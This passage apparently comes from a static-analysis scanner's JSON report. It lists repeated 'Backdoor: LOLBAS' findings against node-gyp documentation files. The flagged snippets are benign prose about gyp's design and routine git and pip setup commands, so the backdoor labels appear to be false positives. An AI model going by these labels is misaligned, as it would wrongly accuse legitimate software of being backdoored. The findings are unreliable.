                    "text": "\nHere's the innards of an email with a laundry list of stuff I came up with a\nwhile back on the gyp-developers list in response to Mike Craddick regarding\nwhat motivated gyp's development, since we were aware of cmake at the time\n(we'd even started a speculative port):\n\n\n",
                    "rendered": {
                      "text": "\nHere's the innards of an email with a laundry list of stuff I came up with a\nwhile back on the gyp-developers list in response to Mike Craddick regarding\nwhat motivated gyp's development, since we were aware of cmake at the time\n(we'd even started a speculative port):\n\n\n",
                      "markdown": "`\nHere's the innards of an email with a laundry list of stuff I came up with a\nwhile back on the gyp-developers list in response to Mike Craddick regarding\nwhat motivated gyp's development, since we were aware of cmake at the time\n(we'd even started a speculative port):\n\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/docs/GypVsCMake.md"
                },
                "region": {
                  "startLine": 109,
                  "startColumn": 63,
                  "endLine": 109,
                  "endColumn": 69,
                  "snippet": {
                    "text": "somewhat poorly specified declarative language (variable expansion happens\nin sometimes weird and counter-intuitive ways). In fairness though, gyp assumes\nthat external python scripts can be used as an escape hatch. Also gyp avoids\na lot of the things you'd need imperative code for, by having a nice target\nsettings publication mechanism.\n\n5. (Feature/drawback depending on personal preference). Gyp's syntax is\n",
                    "rendered": {
                      "text": "somewhat poorly specified declarative language (variable expansion happens\nin sometimes weird and counter-intuitive ways). In fairness though, gyp assumes\nthat external python scripts can be used as an escape hatch. Also gyp avoids\na lot of the things you'd need imperative code for, by having a nice target\nsettings publication mechanism.\n\n5. (Feature/drawback depending on personal preference). Gyp's syntax is\n",
                      "markdown": "`somewhat poorly specified declarative language (variable expansion happens\nin sometimes weird and counter-intuitive ways). In fairness though, gyp assumes\nthat external python scripts can be used as an escape hatch. Also gyp avoids\na lot of the things you'd need imperative code for, by having a nice target\nsettings publication mechanism.\n\n5. (Feature/drawback depending on personal preference). Gyp's syntax is\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/docs/GypVsCMake.md"
                },
                "region": {
                  "startLine": 103,
                  "startColumn": 5,
                  "endLine": 103,
                  "endColumn": 11,
                  "snippet": {
                    "text": "3. gyp currently makes some nasty assumptions about the availability of\nchromium's hermetic copy of cygwin on windows. This causes you to either\nhave to special case a number of rules, or swallow this copy of cygwin as a\nbuild time dependency.\n\n4. CMake includes a fairly readable imperative language. Currently Gyp has a\nsomewhat poorly specified declarative language (variable expansion happens\n",
                    "rendered": {
                      "text": "3. gyp currently makes some nasty assumptions about the availability of\nchromium's hermetic copy of cygwin on windows. This causes you to either\nhave to special case a number of rules, or swallow this copy of cygwin as a\nbuild time dependency.\n\n4. CMake includes a fairly readable imperative language. Currently Gyp has a\nsomewhat poorly specified declarative language (variable expansion happens\n",
                      "markdown": "`3. gyp currently makes some nasty assumptions about the availability of\nchromium's hermetic copy of cygwin on windows. This causes you to either\nhave to special case a number of rules, or swallow this copy of cygwin as a\nbuild time dependency.\n\n4. CMake includes a fairly readable imperative language. Currently Gyp has a\nsomewhat poorly specified declarative language (variable expansion happens\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/docs/GypVsCMake.md"
                },
                "region": {
                  "startLine": 70,
                  "startColumn": 56,
                  "endLine": 70,
                  "endColumn": 61,
                  "snippet": {
                    "text": "when module A depends on module B, it automatically acquires the right build\nsettings without module A being filled with assumptions/knowledge of exactly\nhow module B is built. Additionally, all of the transitive dependencies of\nmodule B are pulled in. This avoids their being a single top level view of\nthe project, rather each gyp file expresses knowledge about its immediate\nneighbors. This keep local knowledge local. CMake effectively has a large\nshared global namespace.\n",
                    "rendered": {
                      "text": "when module A depends on module B, it automatically acquires the right build\nsettings without module A being filled with assumptions/knowledge of exactly\nhow module B is built. Additionally, all of the transitive dependencies of\nmodule B are pulled in. This avoids their being a single top level view of\nthe project, rather each gyp file expresses knowledge about its immediate\nneighbors. This keep local knowledge local. CMake effectively has a large\nshared global namespace.\n",
                      "markdown": "`when module A depends on module B, it automatically acquires the right build\nsettings without module A being filled with assumptions/knowledge of exactly\nhow module B is built. Additionally, all of the transitive dependencies of\nmodule B are pulled in. This avoids their being a single top level view of\nthe project, rather each gyp file expresses knowledge about its immediate\nneighbors. This keep local knowledge local. CMake effectively has a large\nshared global namespace.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/docs/GypVsCMake.md"
                },
                "region": {
                  "startLine": 30,
                  "startColumn": 75,
                  "endLine": 31,
                  "endColumn": 5,
                  "snippet": {
                    "text": "absent from cmake, but not strictly required for Chromium.\n\n1. Ability to incrementally transition on Windows. It took us about 6 months\nto switch fully to gyp. Previous attempts to move to scons had taken a long\ntime and failed, due to the requirement to transition while in flight. For a\nsubstantial period of time, we had a hybrid of checked in vcproj and gyp generated\nvcproj. To this day we still have a good number of GUIDs pinned in the gyp files,\nbecause different parts of our release pipeline have leftover assumptions\n",
                    "rendered": {
                      "text": "absent from cmake, but not strictly required for Chromium.\n\n1. Ability to incrementally transition on Windows. It took us about 6 months\nto switch fully to gyp. Previous attempts to move to scons had taken a long\ntime and failed, due to the requirement to transition while in flight. For a\nsubstantial period of time, we had a hybrid of checked in vcproj and gyp generated\nvcproj. To this day we still have a good number of GUIDs pinned in the gyp files,\nbecause different parts of our release pipeline have leftover assumptions\n",
                      "markdown": "`absent from cmake, but not strictly required for Chromium.\n\n1. Ability to incrementally transition on Windows. It took us about 6 months\nto switch fully to gyp. Previous attempts to move to scons had taken a long\ntime and failed, due to the requirement to transition while in flight. For a\nsubstantial period of time, we had a hybrid of checked in vcproj and gyp generated\nvcproj. To this day we still have a good number of GUIDs pinned in the gyp files,\nbecause different parts of our release pipeline have leftover assumptions\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/docs/GypVsCMake.md"
                },
                "region": {
                  "startLine": 18,
                  "startColumn": 69,
                  "endLine": 19,
                  "snippet": {
                    "text": "\nHere's the innards of an email with a laundry list of stuff I came up with a\nwhile back on the gyp-developers list in response to Mike Craddick regarding\nwhat motivated gyp's development, since we were aware of cmake at the time\n(we'd even started a speculative port):\n\n\nI did an exploratory port of portions of Chromium to cmake (I think I got as\n",
                    "rendered": {
                      "text": "\nHere's the innards of an email with a laundry list of stuff I came up with a\nwhile back on the gyp-developers list in response to Mike Craddick regarding\nwhat motivated gyp's development, since we were aware of cmake at the time\n(we'd even started a speculative port):\n\n\nI did an exploratory port of portions of Chromium to cmake (I think I got as\n",
                      "markdown": "`\nHere's the innards of an email with a laundry list of stuff I came up with a\nwhile back on the gyp-developers list in response to Mike Craddick regarding\nwhat motivated gyp's development, since we were aware of cmake at the time\n(we'd even started a speculative port):\n\n\nI did an exploratory port of portions of Chromium to cmake (I think I got as\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/docs/Hacking.md"
                },
                "region": {
                  "startLine": 34,
                  "startColumn": 33,
                  "endLine": 34,
                  "endColumn": 37,
                  "snippet": {
                    "text": "\nSee [Testing](Testing.md) for more details on the test framework.\n\nNote that it can be handy to look at the project files output by the tests\nto diagnose problems. The easiest way to do that is by kindly asking the\ntest driver to leave the temporary directories it creates in-place.\nThis is done by setting the enviroment variable \"PRESERVE\", e.g.\n",
                    "rendered": {
                      "text": "\nSee [Testing](Testing.md) for more details on the test framework.\n\nNote that it can be handy to look at the project files output by the tests\nto diagnose problems. The easiest way to do that is by kindly asking the\ntest driver to leave the temporary directories it creates in-place.\nThis is done by setting the enviroment variable \"PRESERVE\", e.g.\n",
                      "markdown": "`\nSee [Testing](Testing.md) for more details on the test framework.\n\nNote that it can be handy to look at the project files output by the tests\nto diagnose problems. The easiest way to do that is by kindly asking the\ntest driver to leave the temporary directories it creates in-place.\nThis is done by setting the enviroment variable \"PRESERVE\", e.g.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/docs/Hacking.md"
                },
                "region": {
                  "startLine": 28,
                  "startColumn": 1,
                  "endLine": 28,
                  "endColumn": 6,
                  "snippet": {
                    "text": "\n``` sh\n$ python -m pip install --upgrade pip setuptools\n$ pip install --editable \".[dev]\"\n$ python -m pytest\n```\n\n",
                    "rendered": {
                      "text": "\n``` sh\n$ python -m pip install --upgrade pip setuptools\n$ pip install --editable \".[dev]\"\n$ python -m pytest\n```\n\n",
                      "markdown": "`\n``` sh\n$ python -m pip install --upgrade pip setuptools\n$ pip install --editable \".[dev]\"\n$ python -m pytest\n```\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/docs/Hacking.md"
                },
                "region": {
                  "startLine": 27,
                  "startColumn": 33,
                  "endLine": 27,
                  "endColumn": 38,
                  "snippet": {
                    "text": "You run the test driver with e.g.\n\n``` sh\n$ python -m pip install --upgrade pip setuptools\n$ pip install --editable \".[dev]\"\n$ python -m pytest\n```\n",
                    "rendered": {
                      "text": "You run the test driver with e.g.\n\n``` sh\n$ python -m pip install --upgrade pip setuptools\n$ pip install --editable \".[dev]\"\n$ python -m pytest\n```\n",
                      "markdown": "`You run the test driver with e.g.\n\n``` sh\n$ python -m pip install --upgrade pip setuptools\n$ pip install --editable \".[dev]\"\n$ python -m pytest\n```\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/docs/Hacking.md"
                },
                "region": {
                  "startLine": 27,
                  "startColumn": 11,
                  "endLine": 27,
                  "endColumn": 16,
                  "snippet": {
                    "text": "You run the test driver with e.g.\n\n``` sh\n$ python -m pip install --upgrade pip setuptools\n$ pip install --editable \".[dev]\"\n$ python -m pytest\n```\n",
                    "rendered": {
                      "text": "You run the test driver with e.g.\n\n``` sh\n$ python -m pip install --upgrade pip setuptools\n$ pip install --editable \".[dev]\"\n$ python -m pytest\n```\n",
                      "markdown": "`You run the test driver with e.g.\n\n``` sh\n$ python -m pip install --upgrade pip setuptools\n$ pip install --editable \".[dev]\"\n$ python -m pytest\n```\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/docs/Hacking.md"
                },
                "region": {
                  "startLine": 17,
                  "startColumn": 40,
                  "endLine": 17,
                  "endColumn": 45,
                  "snippet": {
                    "text": "\n(this will clone gyp underneath it into `foo/gyp`.\n`foo` can be any directory name you want. Once you've done that,\nyou can use the repo like anything other Git repo.\n\n## Testing your change\n\n",
                    "rendered": {
                      "text": "\n(this will clone gyp underneath it into `foo/gyp`.\n`foo` can be any directory name you want. Once you've done that,\nyou can use the repo like anything other Git repo.\n\n## Testing your change\n\n",
                      "markdown": "`\n(this will clone gyp underneath it into `foo/gyp`.\n`foo` can be any directory name you want. Once you've done that,\nyou can use the repo like anything other Git repo.\n\n## Testing your change\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/docs/Hacking.md"
                },
                "region": {
                  "startLine": 10,
                  "startColumn": 6,
                  "endLine": 11,
                  "endColumn": 4,
                  "snippet": {
                    "text": "\n```\nmkdir foo\ncd foo\ngit clone git@github.com:nodejs/gyp-next.git\ncd gyp\n```\n\n",
                    "rendered": {
                      "text": "\n```\nmkdir foo\ncd foo\ngit clone git@github.com:nodejs/gyp-next.git\ncd gyp\n```\n\n",
                      "markdown": "`\n```\nmkdir foo\ncd foo\ngit clone git@github.com:nodejs/gyp-next.git\ncd gyp\n```\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/docs/Hacking.md"
                },
                "region": {
                  "startLine": 5,
                  "startColumn": 53,
                  "endLine": 5,
                  "endColumn": 58,
                  "snippet": {
                    "text": "\n## Getting the sources\n\nGit is required to hack on anything, you can set up a git clone of GYP\nas follows:\n\n```\n",
                    "rendered": {
                      "text": "\n## Getting the sources\n\nGit is required to hack on anything, you can set up a git clone of GYP\nas follows:\n\n```\n",
                      "markdown": "`\n## Getting the sources\n\nGit is required to hack on anything, you can set up a git clone of GYP\nas follows:\n\n```\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/docs/Hacking.md"
                },
                "region": {
                  "startLine": 4,
                  "endLine": 5,
                  "endColumn": 4,
                  "snippet": {
                    "text": "# Hacking\n\n## Getting the sources\n\nGit is required to hack on anything, you can set up a git clone of GYP\nas follows:\n\n```\n",
                    "rendered": {
                      "text": "# Hacking\n\n## Getting the sources\n\nGit is required to hack on anything, you can set up a git clone of GYP\nas follows:\n\n```\n",
                      "markdown": "`# Hacking\n\n## Getting the sources\n\nGit is required to hack on anything, you can set up a git clone of GYP\nas follows:\n\n```\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/docs/InputFormatReference.md"
                },
                "region": {
                  "startLine": 1021,
                  "startColumn": 7,
                  "endLine": 1021,
                  "endColumn": 11,
                  "snippet": {
                    "text": "A `conditions` section introduces a subdictionary that is only merged\ninto the enclosing scope based on the evaluation of a conditional\nexpression.  Each `condition` within a `conditions` list is itself a\nlist of at least two items:\n\n  1. A string containing the conditional expression itself.  Conditional\n  expressions may take the following forms:\n",
                    "rendered": {
                      "text": "A `conditions` section introduces a subdictionary that is only merged\ninto the enclosing scope based on the evaluation of a conditional\nexpression.  Each `condition` within a `conditions` list is itself a\nlist of at least two items:\n\n  1. A string containing the conditional expression itself.  Conditional\n  expressions may take the following forms:\n",
                      "markdown": "`A `conditions` section introduces a subdictionary that is only merged\ninto the enclosing scope based on the evaluation of a conditional\nexpression.  Each `condition` within a `conditions` list is itself a\nlist of at least two items:\n\n  1. A string containing the conditional expression itself.  Conditional\n  expressions may take the following forms:\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/docs/InputFormatReference.md"
                },
                "region": {
                  "startLine": 790,
                  "startColumn": 41,
                  "endLine": 790,
                  "endColumn": 45,
                  "snippet": {
                    "text": "## Linking Dependencies\n\nThe precise meaning of a dependency relationship varies with the\n[types](#type) of the [targets](#targets) at either end of the\nrelationship.  In GYP, a dependency relationship can indicate two things\nabout how targets relate to each other:\n\n",
                    "rendered": {
                      "text": "## Linking Dependencies\n\nThe precise meaning of a dependency relationship varies with the\n[types](#type) of the [targets](#targets) at either end of the\nrelationship.  In GYP, a dependency relationship can indicate two things\nabout how targets relate to each other:\n\n",
                      "markdown": "`## Linking Dependencies\n\nThe precise meaning of a dependency relationship varies with the\n[types](#type) of the [targets](#targets) at either end of the\nrelationship.  In GYP, a dependency relationship can indicate two things\nabout how targets relate to each other:\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/docs/InputFormatReference.md"
                },
                "region": {
                  "startLine": 539,
                  "startColumn": 5,
                  "endLine": 539,
                  "endColumn": 13,
                  "snippet": {
                    "text": "}\n```\n\nmight expand to:\n\n```\n{\n",
                    "rendered": {
                      "text": "}\n```\n\nmight expand to:\n\n```\n{\n",
                      "markdown": "`}\n```\n\nmight expand to:\n\n```\n{\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/docs/InputFormatReference.md"
                },
                "region": {
                  "startLine": 487,
                  "startColumn": 7,
                  "endLine": 487,
                  "endColumn": 11,
                  "snippet": {
                    "text": "\nCommand expansions function similarly to variable expansions, but\ninstead of resolving variable references, they cause GYP to execute a\ncommand at generation time and use the command’s output as the\nreplacement.  Command expansions are introduced by a less than and\nexclamation mark (`<!`).\n\n",
                    "rendered": {
                      "text": "\nCommand expansions function similarly to variable expansions, but\ninstead of resolving variable references, they cause GYP to execute a\ncommand at generation time and use the command’s output as the\nreplacement.  Command expansions are introduced by a less than and\nexclamation mark (`<!`).\n\n",
                      "markdown": "`\nCommand expansions function similarly to variable expansions, but\ninstead of resolving variable references, they cause GYP to execute a\ncommand at generation time and use the command’s output as the\nreplacement.  Command expansions are introduced by a less than and\nexclamation mark (`<!`).\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/docs/InputFormatReference.md"
                },
                "region": {
                  "startLine": 478,
                  "startColumn": 63,
                  "endLine": 479,
                  "snippet": {
                    "text": "      above.  The conversion into a list is generator-specific, but\n      generally, spaces in the string are taken as separators between\n      list items.  The specific method of converting the string to a\n      list should be the inverse of the encoding method used to expand\n      list variables in string context, above.\n\nGYP treats references to undefined variables as errors.\n\n",
                    "rendered": {
                      "text": "      above.  The conversion into a list is generator-specific, but\n      generally, spaces in the string are taken as separators between\n      list items.  The specific method of converting the string to a\n      list should be the inverse of the encoding method used to expand\n      list variables in string context, above.\n\nGYP treats references to undefined variables as errors.\n\n",
                      "markdown": "`      above.  The conversion into a list is generator-specific, but\n      generally, spaces in the string are taken as separators between\n      list items.  The specific method of converting the string to a\n      list should be the inverse of the encoding method used to expand\n      list variables in string context, above.\n\nGYP treats references to undefined variables as errors.\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/docs/InputFormatReference.md"
                },
                "region": {
                  "startLine": 361,
                  "startColumn": 69,
                  "endLine": 362,
                  "snippet": {
                    "text": "### Providing Default Values for Variables (%)\n\nWithin a `variables` section, keys named with percent sign (`%`)\nsuffixes mean that the variable should be set only if it is undefined at\nthe time it is processed.  This can be used to provide defaults for\nvariables that would otherwise be undefined, so that they may reliably\nbe used in [variable expansion or conditional\nprocessing](#Variables_and_Conditionals).\n",
                    "rendered": {
                      "text": "### Providing Default Values for Variables (%)\n\nWithin a `variables` section, keys named with percent sign (`%`)\nsuffixes mean that the variable should be set only if it is undefined at\nthe time it is processed.  This can be used to provide defaults for\nvariables that would otherwise be undefined, so that they may reliably\nbe used in [variable expansion or conditional\nprocessing](#Variables_and_Conditionals).\n",
                      "markdown": "`### Providing Default Values for Variables (%)\n\nWithin a `variables` section, keys named with percent sign (`%`)\nsuffixes mean that the variable should be set only if it is undefined at\nthe time it is processed.  This can be used to provide defaults for\nvariables that would otherwise be undefined, so that they may reliably\nbe used in [variable expansion or conditional\nprocessing](#Variables_and_Conditionals).\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/docs/InputFormatReference.md"
                },
                "region": {
                  "startLine": 317,
                  "startColumn": 27,
                  "endLine": 317,
                  "endColumn": 31,
                  "snippet": {
                    "text": "`.gyp` or `.gypi` (include) file.  `includes` sections contain lists of\nother files to include.  They are processed sequentially and merged into\nthe enclosing dictionary at the point that the `includes` section was\nfound.  `includes` sections at the root of a `.gyp` file dictionary are\nmerged after any `-I` includes from the command line.\n\n[includes](#includes) sections are processed immediately after a file is\n",
                    "rendered": {
                      "text": "`.gyp` or `.gypi` (include) file.  `includes` sections contain lists of\nother files to include.  They are processed sequentially and merged into\nthe enclosing dictionary at the point that the `includes` section was\nfound.  `includes` sections at the root of a `.gyp` file dictionary are\nmerged after any `-I` includes from the command line.\n\n[includes](#includes) sections are processed immediately after a file is\n",
                      "markdown": "``.gyp` or `.gypi` (include) file.  `includes` sections contain lists of\nother files to include.  They are processed sequentially and merged into\nthe enclosing dictionary at the point that the `includes` section was\nfound.  `includes` sections at the root of a `.gyp` file dictionary are\nmerged after any `-I` includes from the command line.\n\n[includes](#includes) sections are processed immediately after a file is\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/docs/InputFormatReference.md"
                },
                "region": {
                  "startLine": 316,
                  "startColumn": 24,
                  "endLine": 316,
                  "endColumn": 28,
                  "snippet": {
                    "text": "An [includes](#includes) section may be placed anywhere within a\n`.gyp` or `.gypi` (include) file.  `includes` sections contain lists of\nother files to include.  They are processed sequentially and merged into\nthe enclosing dictionary at the point that the `includes` section was\nfound.  `includes` sections at the root of a `.gyp` file dictionary are\nmerged after any `-I` includes from the command line.\n\n",
                    "rendered": {
                      "text": "An [includes](#includes) section may be placed anywhere within a\n`.gyp` or `.gypi` (include) file.  `includes` sections contain lists of\nother files to include.  They are processed sequentially and merged into\nthe enclosing dictionary at the point that the `includes` section was\nfound.  `includes` sections at the root of a `.gyp` file dictionary are\nmerged after any `-I` includes from the command line.\n\n",
                      "markdown": "`An [includes](#includes) section may be placed anywhere within a\n`.gyp` or `.gypi` (include) file.  `includes` sections contain lists of\nother files to include.  They are processed sequentially and merged into\nthe enclosing dictionary at the point that the `includes` section was\nfound.  `includes` sections at the root of a `.gyp` file dictionary are\nmerged after any `-I` includes from the command line.\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/docs/InputFormatReference.md"
                },
                "region": {
                  "startLine": 265,
                  "startColumn": 46,
                  "endLine": 265,
                  "endColumn": 50,
                  "snippet": {
                    "text": "## List Singletons\n\nSome list items are treated as singletons, and the list merge process\nwill enforce special rules when merging them.  At present, any string\nitem in a list that does not begin with a dash (`-`) is treated as a\nsingleton, although **this is subject to change.**  When appending or\nprepending a singleton to a list, if the item is already in the list,\n",
                    "rendered": {
                      "text": "## List Singletons\n\nSome list items are treated as singletons, and the list merge process\nwill enforce special rules when merging them.  At present, any string\nitem in a list that does not begin with a dash (`-`) is treated as a\nsingleton, although **this is subject to change.**  When appending or\nprepending a singleton to a list, if the item is already in the list,\n",
                      "markdown": "`## List Singletons\n\nSome list items are treated as singletons, and the list merge process\nwill enforce special rules when merging them.  At present, any string\nitem in a list that does not begin with a dash (`-`) is treated as a\nsingleton, although **this is subject to change.**  When appending or\nprepending a singleton to a list, if the item is already in the list,\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
